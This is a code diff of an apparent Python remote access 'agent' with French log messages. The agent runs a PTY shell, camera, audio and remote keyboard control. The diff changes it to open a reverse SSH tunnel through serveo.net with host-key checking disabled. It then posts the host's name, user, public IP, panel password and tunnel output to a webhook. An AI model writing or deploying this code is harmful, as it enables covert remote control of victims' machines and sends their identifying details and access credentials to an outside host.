@@ -17,8 +17,8 @@ shell_fd = None
 shell_pid = None
 current_dir = os.path.expanduser("~")
 camera = None
-tunnel_url = None
 audio_process = None
+tunnel_output = ""
 
 ansi_re = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
 def strip_ansi(text): return ansi_re.sub('', text)
@@ -409,81 +409,47 @@ def on_remote_key(d): remote_key(d["key"])
 def on_remote_type(d): remote_type(d["text"])
 
 # ===== TUNNEL =====
-def tunnel_ssh(domain):
-    global tunnel_url, tunnel_urls
-    print(f"[*] Tentative {domain}...")
+tunnel_output = ""
+
+def start_tunnel(domain="serveo.net"):
+    global tunnel_output
+    print(f"[*] Connexion à {domain}...")
+    tunnel_output = ""
     cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=30", "-o", "ConnectTimeout=10",
            "-R", "80:localhost:5000", domain]
+
+    def reader(proc):
+        global tunnel_output
+        for line in iter(proc.stdout.readline, ""):
+            tunnel_output += line
+            print(f"[{domain}]", line.rstrip())
+
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
-
-        bad_prefixes = ("admin.", "console.", "www.", "app.")
-        def good_url(u):
-            if any(u.startswith(f"https://{p}") for p in bad_prefixes): return False
-            if u in ("https://serveo.net", "https://localhost.run"): return False
-            return True
-
-        def extract_urls(line):
-            for m in re.finditer(rf'(https?://)?[a-z0-9-]+\.{domain.replace(".", "\\.")}', line):
-                u = m.group()
-                if not u.startswith("http"): u = "https://" + u
-                if u not in tunnel_urls: tunnel_urls.append(u)
-                if good_url(u): print(f"[+] {domain} URL: {u}")
-            if domain in line:
-                for w in line.split():
-                    if domain in w:
-                        u = w.strip('.,;:!?\\"\'()[]{}<>')
-                        if not u.startswith("http"): u = "https://" + u
-                        if u not in tunnel_urls:
-                            tunnel_urls.append(u)
-                            print(f"[{domain}] extracted: {u}")
-
-        def reader():
-            for line in iter(proc.stdout.readline, ""):
-                line = line.strip()
-                if line: print(f"[{domain}]", line)
-                extract_urls(line)
-
-        t = threading.Thread(target=reader, daemon=True)
+        t = threading.Thread(target=reader, args=(proc,), daemon=True)
         t.start()
-        for _ in range(30):
-            for u in tunnel_urls:
-                if good_url(u):
-                    tunnel_url = u
-                    print(f"[+] {domain} URL confirmée: {tunnel_url}")
-                    return tunnel_url
-            time.sleep(1)
-        return None
+        return proc
     except Exception as e:
         print(f"[-] {domain} error: {e}")
+        tunnel_output += f"ERROR: {e}\n"
         return None
 
-def start_tunnel():
-    global tunnel_url, tunnel_urls
-    tunnel_urls = []
-    tunnel_url = tunnel_ssh("serveo.net")
-    if tunnel_url: return tunnel_url
-    return None
-
-def send_webhook(url, extra_urls=None):
+def send_webhook(console_output):
     try:
         host = subprocess.run(["hostname"], capture_output=True, text=True, timeout=5).stdout.strip()
         user = os.getenv("USER", "unknown")
         ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
-        fields = [
-            {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
-            {"name": "🖥 Hostname", "value": host, "inline": True},
-            {"name": "👤 User", "value": user, "inline": True},
-            {"name": "🌍 IP", "value": ip, "inline": True},
-            {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
-        ]
-        if extra_urls:
-            others = "\n".join(f"• {u}?auth={PASSWORD}" for u in extra_urls if u != url)
-            if others: fields.append({"name": "🔄 Autres URLs", "value": others, "inline": False})
+        console_output = console_output[-1800:]
         requests.post(WEBHOOK_URL, json={"embeds": [{
             "title": "🚀 Kali Agent Prêt", "color": 5763719,
-            "fields": fields,
+            "fields": [
+                {"name": "🖥 Hostname", "value": host, "inline": True},
+                {"name": "👤 User", "value": user, "inline": True},
+                {"name": "🌍 IP", "value": ip, "inline": True},
+                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True},
+                {"name": "📋 Console tunnel", "value": f"```\n{console_output}\n```", "inline": False}
+            ],
             "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
         }]}, timeout=10)
         print("[+] Webhook envoyé")
@@ -492,11 +458,7 @@ def send_webhook(url, extra_urls=None):
 if __name__ == "__main__":
     print("[+] Démarrage de l'agent Kali..."); print(f"[+] Port: {PORT}")
     start_shell(); print("[+] Shell PTY démarré")
-    url = start_tunnel()
-    if url:
-        print(f"[+] URL: {url}?auth={PASSWORD}")
-    else:
-        print(f"[-] Aucun tunnel trouvé, accès local uniquement")
-        url = f"http://127.0.0.1:{PORT}"
-    send_webhook(url, tunnel_urls)
+    proc = start_tunnel("serveo.net")
+    time.sleep(10)
+    send_webhook(tunnel_output)
     socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
